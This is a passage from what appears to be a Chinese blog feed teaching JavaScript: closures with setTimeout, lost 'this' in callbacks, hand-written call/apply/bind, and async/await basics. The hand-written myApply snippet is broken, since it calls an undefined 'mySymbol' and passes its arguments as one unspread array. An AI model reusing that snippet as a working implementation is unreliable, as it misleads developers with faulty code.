1000);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>造成这个现象的原因是等到<code>setTimeout</code>异步执行时,<code>i</code>已经变成6了。</p><p>关于js事件循环机制不理解的同学，可以看我这篇博客：<a href="https://juejin.im/post/6844903621872582669">Js 的事件循环(Event Loop)机制以及实例讲解</a></p><p>那么如何使他输出: 1,2,3,4,5呢？</p><p>方法有很多：</p><ul><li>闭包, 保存变量</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for (var i &#x3D; 1; i &lt;&#x3D; 5; i++) &#123;</span><br><span class="line">    (function (i) &#123;</span><br><span class="line">        setTimeout(function () &#123;</span><br><span class="line">            console.log(&#39;闭包:&#39;, i); &#x2F;&#x2F; 依次输出：1 2 3 4 5</span><br><span class="line">        &#125;, i * 1000);</span><br><span class="line">    &#125;(i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里创建了一个闭包，每次循环都会把<code>i</code>的最新值传进去，然后被闭包保存起来。</p><ul><li><strong>bind</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for (var i &#x3D; 1; i &lt;&#x3D; 5; i++) &#123;</span><br><span class="line">    &#x2F;&#x2F; 缓存参数</span><br><span class="line">    setTimeout(function (i) &#123;</span><br><span class="line">        console.log(&#39;bind&#39;, i) &#x2F;&#x2F; 依次输出：1 2 3 4 5</span><br><span class="line">    &#125;.bind(null, i), i * 1000);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>实际上这里也用了闭包，我们知道bind会返回一个函数，这个函数也是闭包</strong>。</p><p>它保存了函数的this指向、初始参数，每次<code>i</code>的变更都会被bind的闭包存起来，所以输出1-5。</p><p>具体细节，下面有个手写bind方法，研究一下，就能搞懂了。</p><ul><li><code>let</code></li></ul><p>用<code>let</code>声明<code>i</code>也可以输出1-5: 因为<code>let</code>是块级作用域,所以每次都会创建一个新的变量,所以<code>setTimeout</code>每次读的值都是不同的,<a href="https://link.juejin.cn/?target=https://segmentfault.com/q/1010000007541743">详解</a>。</p><h4 id="2-回调函数this丢失问题："><a href="#2-回调函数this丢失问题：" class="headerlink" title="2. 回调函数this丢失问题："></a>2. 回调函数this丢失问题：</h4><p>这是一个常见的问题，下面是我在开发VSCode插件处理<code>webview</code>通信时，遇到的真实问题，一开始以为VSCode的API哪里出问题，调试了一番才发现是<code>this</code>指向丢失的问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class Page &#123;</span><br><span class="line">    constructor(callBack) &#123;</span><br><span class="line">        this.className &#x3D; &#39;Page&#39;</span><br><span class="line">        this.MessageCallBack &#x3D; callBack &#x2F;&#x2F; </span><br><span class="line">        this.MessageCallBack(&#39;发给注册页面的信息&#39;) &#x2F;&#x2F; 执行PageA的回调函数</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class PageA &#123;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        this.className &#x3D; &#39;PageA&#39;</span><br><span class="line">        this.pageClass &#x3D; new Page(this.handleMessage) &#x2F;&#x2F; 注册页面 传递回调函数 问题在这里</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 与页面通信回调</span><br><span class="line">    handleMessage(msg) &#123;</span><br><span class="line">        console.log(&#39;处理通信&#39;, this.className, msg) &#x2F;&#x2F;  &#39;Page&#39; this指向错误</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">new PageA()</span><br></pre></td></tr></table></figure><h4 id="回调函数this为何会丢失？"><a href="#回调函数this为何会丢失？" class="headerlink" title="回调函数this为何会丢失？"></a>回调函数<code>this</code>为何会丢失？</h4><p>显然声明的时候不会出现问题，执行回调函数的时候也不可能出现问题。</p><p>问题出在传递回调函数的时候：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.pageClass &#x3D; new Page(this.handleMessage)</span><br></pre></td></tr></table></figure><p>因为传递过去的<code>this.handleMessage</code>是一个函数内存地址，没有上下文对象，也就是说该函数没有绑定它的<code>this</code>指向。</p><p>那它的<code>this</code>指向于它所应用的<a href="https://juejin.im/post/6844903630592540686#comment">绑定规则</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Page &#123;</span><br><span class="line">    constructor(callBack) &#123;</span><br><span class="line">        this.className &#x3D; &#39;Page&#39;</span><br><span class="line">        &#x2F;&#x2F; callBack() &#x2F;&#x2F; 直接执行的话 由于class 内部是严格模式，所以this 实际指向的是 undefined</span><br><span class="line">        this.MessageCallBack &#x3D; callBack &#x2F;&#x2F; 回调函数的this 隐式绑定到class page</span><br><span class="line">        this.MessageCallBack(&#39;发给注册页面的信息&#39;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然知道问题了，那我们只要绑定回调函数的<code>this</code>指向为<code>PageA</code>就解决问题了。</p><p><strong>回调函数this丢失的解决方案</strong>：</p><ol><li><code>bind</code>绑定回调函数的<code>this</code>指向：</li></ol><p>这是典型bind的应用场景, 绑定this指向，用做回调函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.pageClass &#x3D; new Page(this.handleMessage.bind(this)) &#x2F;&#x2F; 绑定回调函数的this指向</span><br></pre></td></tr></table></figure><p>PS： 这也是为什么<code>react</code>的<code>render</code>函数在绑定回调函数的时候，也要使用bind绑定一下<code>this</code>的指向，也是因为同样的问题以及原理。</p><ol><li>箭头函数绑定this指向</li></ol><p>箭头函数的this指向定义的时候外层第一个普通函数的this，在这里指的是class类：<code>PageA</code></p><p>这块内容，可以看下我之前写的博客：<a href="https://juejin.im/post/6844903801799835655#heading-3">详解箭头函数和普通函数的区别以及箭头函数的注意事项、不适用场景</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.pageClass &#x3D; new Page(() &#x3D;&gt; this.handleMessage()) &#x2F;&#x2F; 箭头函数绑定this指向</span><br></pre></td></tr></table></figure><h3 id="手写call-apply、bind"><a href="#手写call-apply、bind" class="headerlink" title="手写call/apply、bind"></a>手写call/apply、bind</h3><ul><li>call</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;传递参数从一个数组变成逐个传参了,不用...扩展运算符的也可以用arguments代替</span><br><span class="line">Function.prototype.myCall &#x3D; function (context, ...args) &#123;</span><br><span class="line">    &#x2F;&#x2F;这里默认不传就是给window,也可以用es6给参数设置默认参数</span><br><span class="line">    context &#x3D; context || window</span><br><span class="line">    args &#x3D; args ? args : []</span><br><span class="line">    &#x2F;&#x2F;给context新增一个独一无二的属性以免覆盖原有属性</span><br><span class="line">    const key &#x3D; Symbol()</span><br><span class="line">    context[key] &#x3D; this</span><br><span class="line">    &#x2F;&#x2F;通过隐式绑定的方式调用函数</span><br><span class="line">    const result &#x3D; context[key](...args)</span><br><span class="line">    &#x2F;&#x2F;删除添加的属性</span><br><span class="line">    delete context[key]</span><br><span class="line">    &#x2F;&#x2F;返回函数调用的返回值</span><br><span class="line">    return result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>apply</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.myApply &#x3D; function(context) &#123;</span><br><span class="line">        &#x2F;&#x2F; 如果没有传或传的值为空对象 context指向window</span><br><span class="line">        if (typeof context &#x3D;&#x3D;&#x3D; &quot;undefined&quot; || context &#x3D;&#x3D;&#x3D; null) &#123;</span><br><span class="line">            context &#x3D; window</span><br><span class="line">        &#125;</span><br><span class="line">        let fn &#x3D; mySymbol(context)</span><br><span class="line">        context[fn] &#x3D; this &#x2F;&#x2F;给context添加一个方法 指向this</span><br><span class="line">            &#x2F;&#x2F; 处理参数 去除第一个参数this 其它传入fn函数</span><br><span class="line">        let arg &#x3D; [...arguments].slice(1) &#x2F;&#x2F;[...xxx]把类数组变成数组，arguments为啥不是数组自行搜索 slice返回一个新数组</span><br><span class="line">        context[fn](arg) &#x2F;&#x2F;执行fn</span><br><span class="line">        delete context[fn] &#x2F;&#x2F;删除方法</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>bind</li></ul><p><strong>思路</strong></p><ol><li>拷贝源函数:<ul><li>通过变量储存源函数</li><li>使用<code>Object.create</code>复制源函数的prototype给fToBind</li></ul></li><li>返回拷贝的函数</li><li>调用拷贝的函数：<ul><li>new调用判断：通过<code>instanceof</code>判断函数是否通过<code>new</code>调用，来决定绑定的<code>context</code></li><li>绑定this+传递参数</li><li>返回源函数的执行结果</li></ul></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myBind = <span class="function"><span class="keyword">function</span> (<span class="params">objThis, ...params</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> thisFn = <span class="built_in">this</span>; <span class="comment">// 存储源函数以及上方的params(函数参数)</span></span><br><span class="line">    <span class="comment">// 对返回的函数 secondParams 二次传参</span></span><br><span class="line">    <span class="keyword">let</span> fToBind = <span class="function"><span class="keyword">function</span> (<span class="params">...secondParams</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> isNew = <span class="built_in">this</span> <span class="keyword">instanceof</span> fToBind <span class="comment">// this是否是fToBind的实例 也就是返回的fToBind是否通过new调用</span></span><br><span class="line">        <span class="keyword">const</span> context = isNew ? <span class="built_in">this</span> : <span class="built_in">Object</span>(objThis) <span class="comment">// new调用就绑定到this上,否则就绑定到传入的objThis上</span></span><br><span class="line">        <span class="keyword">return</span> thisFn.call(context, ...params, ...secondParams); <span class="comment">// 用call调用源函数绑定this的指向并传递参数,返回执行结果</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> (thisFn.prototype) &#123;</span><br><span class="line">        <span class="comment">// 复制源函数的prototype给fToBind 一些情况下函数没有prototype，比如箭头函数</span></span><br><span class="line">        fToBind.prototype = <span class="built_in">Object</span>.create(thisFn.prototype);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fToBind; <span class="comment">// 返回拷贝的函数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="JavaScript" scheme="http://aiolimp.com/categories/JavaScript/"/>
    
    
    <category term="JavaScript" scheme="http://aiolimp.com/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>async、await</title>
    <link href="http://aiolimp.com/2021/07/12/async%E3%80%81await/"/>
    <id>http://aiolimp.com/2021/07/12/async%E3%80%81await/</id>
    <published>2021-07-12T08:57:49.000Z</published>
    <updated>2023-03-05T13:32:12.211Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="async、await"><a href="#async、await" class="headerlink" title="async、await"></a>async、await</h1><h2 id="async"><a href="#async" class="headerlink" title="async"></a>async</h2><h3 id="什么是async？"><a href="#什么是async？" class="headerlink" title="什么是async？"></a>什么是async？</h3><p><code>async</code> 函数是 <code>Generator</code> 函数的语法糖。使用 关键字 <code>async</code> 来表示，在函数内部使用 <code>await</code> 来表示异步。相较于 <code>Generator</code>，<code>async</code> 函数的改进在于下面四点：</p><ul><li><strong>内置执行器</strong>。<code>Generator</code> 函数的执行必须依靠执行器，而 <code>async</code> 函数自带执行器，调用方式跟普通函数的调用一样</li><li><strong>更好的语义</strong>。<code>async</code> 和 <code>await</code> 相较于 <code>*</code> 和 <code>yield</code> 更加语义化</li><li><strong>更广的适用性</strong>。<code>co</code> 模块约定，<code>yield</code> 命令后面只能是 Thunk 函数或 Promise对象。而 <code>async</code> 函数的 <code>await</code> 命令后面则可以是 Promise 或者 原始类型的值（Number，string，boolean，但这时等同于同步操作）</li><li><strong>返回值是 Promise</strong>。<code>async</code> 函数返回值是 Promise 对象，比 Generator 函数返回的 Iterator 对象方便，可以直接使用 <code>then()</code> 方法进行调用</li></ul><p><code>async</code>是ES7新出的特性，表明当前函数是异步函数，不会阻塞线程导致后续代码停止运行。</p><h3 id="怎么用"><a href="#怎么用" class="headerlink" title="怎么用"></a>怎么用</h3><p>申明之后就可以进行调用了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">asyncFn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">　　<span class="keyword">return</span> <span class="string">&#x27;hello world&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">asyncFn();</span><br></pre></td></tr></table></figure><p>这样就表示这是异步函数，返回的结果</p><p><img src="https://img-blog.csdnimg.cn/bd1bf882248e4c748d2db0f4d99cc513.png" alt="在这里插入图片描述"></p><blockquote><p>async 表示函数里有异步操作</p><p>await 表示紧跟在后面的表达式需要等待结果。</p></blockquote><p>返回的是一个<code>promise</code>对象，状态为<code>resolved</code>，参数是<code>return</code>的值。那再看下面这个函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">asyncFn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;我后执行&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">asyncFn().then(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;我先执行&#x27;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d6e26fa50cef4b978f6fa3cb085c501d.png" alt="在这里插入图片描述"></p><p>上面的执行结果是先打印出<code>&#39;我先执行&#39;</code>，虽然是上面<code>asyncFn()</code>先执行，但是已经被定义异步函数了，不会影响后续函数的执行。</p><p>现在理解了<code>async</code>基本的使用，那还有什么特性呢？</p><p><code>async</code>定义的函数内部会默认返回一个<code>promise</code>对象，如果函数内部抛出异常或者是返回<code>reject</code>，都会使函数的<code>promise</code>状态为失败<code>reject</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>) </span>&#123;    </span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;has Error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">e().then(<span class="function"><span class="params">success</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;成功&#x27;</span>, success))   </span><br><span class="line">   .catch(<span class="function"><span class="params">error</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;失败&#x27;</span>, error));![img](https:<span class="comment">//p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2018/6/13/163f53f3b4a1f90d~tplv-t2oaga2asx-zoom-in-crop-mark:652:0:0:0.awebp)</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/a877e2810a3445598a7f4e9fcfb2c9a8.png" alt="在这里插入图片描述"></p><p>我们看到函数内部抛出了一个<code>异常</code>，返回<code>reject</code>，<code>async</code>函数接收到之后，判定执行失败进入<code>catch</code>，该返回的错误打印了出来。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">throwStatus</span>(<span class="params"></span>) </span>&#123;    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;可以返回所有类型的值&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">throwStatus().then(<span class="function"><span class="params">success</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;成功&#x27;</span>, success))             </span><br><span class="line">             .catch(<span class="function"><span class="params">error</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;失败&#x27;</span>, error));</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印结果</span></span><br><span class="line"></span><br><span class="line">成功 可以返回所有类型的值</span><br></pre></td></tr></table></figure><p>async<code>函数接收到返回的值，发现不是</code>异常<code>或者</code>reject<code>，则判定成功，这里可以</code>return<code>各种数据类型的值，</code>false<code>,</code>NaN<code>,</code>undefined<code>...总之，都是</code>resolve</p><p>但是返回如下结果会使<code>async</code>函数判定失败<code>reject</code></p><ol><li>内部含有直接使用并且未声明的变量或者函数。</li><li>内部抛出一个错误<code>throw new Error</code>或者返回<code>reject</code>状态<code>return Promise.reject(&#39;执行失败&#39;)</code></li><li>函数方法执行出错（🌰：Object使用push()）等等…</li></ol><p>还有一点，在<code>async</code>里，必须要将结果<code>return</code>回来，不然的话不管是执行<code>reject</code>还是<code>resolved</code>的值都为<code>undefine</code>，建议使用箭头函数。</p><p>其余返回结果都是判定<code>resolved</code>成功执行。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//正确reject方法。必须将reject状态return出去。</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">PromiseError</span>(<span class="params"></span>) </span>&#123;    </span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(<span class="string">&#x27;has Promise Error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这是错误的做法，并且判定resolve，返回值为undefined,并且Uncaught报错</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">PromiseError</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">Promise</span>.reject(<span class="string">&#x27;这是错误的做法&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PromiseError().then(<span class="function"><span class="params">success</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;成功&#x27;</span>, success))              </span><br><span class="line">              .catch(<span class="function"><span class="params">error</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;失败&#x27;</span>, error));</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/101c19d5dff04c7f8e3b88233c78ed33.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>我们看到第二行多了个<code>Promise</code>对象打印，不用在意，这个是在<code>Chrome</code>控制台的默认行为，我们平常在控制台进行赋值也是同样的效果。如果最后<code>执行语句</code>或者<code>表达式</code>没有<code>return</code>返回值，默认<code>undefined</code>，做个小实验。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//undefined</span></span><br><span class="line">------------------------------------------------------------</span><br><span class="line"><span class="built_in">console</span>.log(a);</span><br><span class="line"><span class="comment">//1</span></span><br><span class="line"><span class="comment">//undefined</span></span><br><span class="line">------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123; <span class="built_in">console</span>.log(<span class="number">1</span>) &#125;</span><br><span class="line">a();</span><br><span class="line"><span class="comment">//1</span></span><br><span class="line"><span class="comment">//undefined</span></span><br><span class="line">------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span>&#123; <span class="keyword">return</span> <span class="built_in">console</span>.log(<span class="number">1</span>) &#125;</span><br><span class="line">b();</span><br><span class="line"><span class="comment">//1</span></span><br><span class="line"><span class="comment">//undefined</span></span><br><span class="line">------------------------------------------------------------</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span>&#123; <span class="keyword">return</span> <span class="number">1</span>&#125;</span><br><span class="line">c();</span><br><span class="line"><span class="comment">//1</span></span><br><span class="line">------------------------------------------------------------</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="string">&#x27;这个值接收不到&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">d().then(<span class="function"><span class="params">success</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;成功&#x27;</span>,success));</span><br><span class="line"><span class="comment">//成功  undefined</span></span><br><span class="line"><span class="comment">//Promise &#123; &lt;resolved&gt;: undefined &#125;</span></span><br><span class="line">-----------------------------------------------------------</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;接收到了&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">e().then(<span class="function"><span class="params">success</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;成功&#x27;</span>,success));</span><br><span class="line"><span class="comment">//成功  接收到了</span></span><br><span class="line"><span class="comment">//Promise &#123; &lt;resolved&gt;: undefined &#125;</span></span><br></pre></td></tr></table></figure><p>最后一行<code>Promise &#123; &lt;resolved&gt; : undefined &#125;</code> 是因为返回的是<code>console.log</code>执行语句，没有返回值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">d().then(<span class="function"><span class="params">success</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;成功&#x27;</span>,success)&#125;</span><br><span class="line">等同于</span><br><span class="line">d().then(<span class="function"><span class="keyword">function</span>(<span class="params">success</span>)</span>&#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">console</span>.log(<span class="string">&#x27;成功&#x27;</span>,success);</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><p>js本身是单线程的，通过v8我们可以拥有”异步”的能力</p><p>认识完了async，来讲讲await。</p><h2 id="await是什么？"><a href="#await是什么？" class="headerlink" title="await是什么？"></a>await是什么？</h2><p><code>await</code>意思是async wait(异步等待)。这个关键字只能在使用<code>async</code>定义的函数里面使用。任何<code>async</code>函数都会默认返回<code>promise</code>，并且这个<code>promise</code>解析的值都将会是这个函数的返回值，而<code>async</code>函数必须等到内部所有的 <code>await</code> 命令的 <code>Promise</code> 对象执行完，才会发生状态改变。</p><p><strong>打个比方，await是学生，async是校车，必须等人齐了再开车。</strong></p><p>就是说，必须等所有<code>await</code> 函数执行完毕后，才会告诉<code>promise</code>我成功了还是失败了，执行<code>then</code>或者<code>catch</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">awaitReturn</span>(<span class="params"></span>) </span>&#123;     </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line">awaitReturn().then(<span class="function"><span class="params">success</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;成功&#x27;</span>, success))</span><br><span class="line">             .catch(<span class="function"><span class="params">error</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;失败&#x27;</span>,error))</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/f9a4f6da4c824e9f924c2d48b24eb1ef.png" alt="在这里插入图片描述"></p><p>在这个函数里，有一个<code>await</code>函数，async会等到<code>await 1</code> 这一步执行完了才会返回<code>promise</code>状态，毫无疑问，判定<code>resolved</code>。</p><p>*<em>很多人以为<code>await</code>会一直等待之后的表达式执行完之后才会继续执行后面的代码，*</em>**实际上<code>await</code>是一个让出线程的标志**<em>*。<code>await</code>后面的函数会先执行一遍(比如await Fn()的Fn ,并非是下一行代码)，然后就会跳出整个<code>async</code>函数来执行后面js栈的代码。等本轮事件循环执行完了之后又会跳回到<code>async</code>函数中等待await*</em>*<em>后面表达式的返回值，如果返回值为非<code>promise</code>则继续执行<code>async</code>函数后面的代码，否则将返回的<code>promise</code>放入<code>Promise</code>队列（Promise的Job Queue）</em>*</p><p>来看个简单点的例子</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> timeoutFn = <span class="function"><span class="keyword">function</span>(<span class="params">timeout</span>)</span>&#123; </span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">setTimeout</span>(resolve, timeout);</span><br><span class="line">               &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">await</span> timeoutFn(<span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">await</span> timeoutFn(<span class="number">2000</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;完成&#x27;</span>;</span><br><span 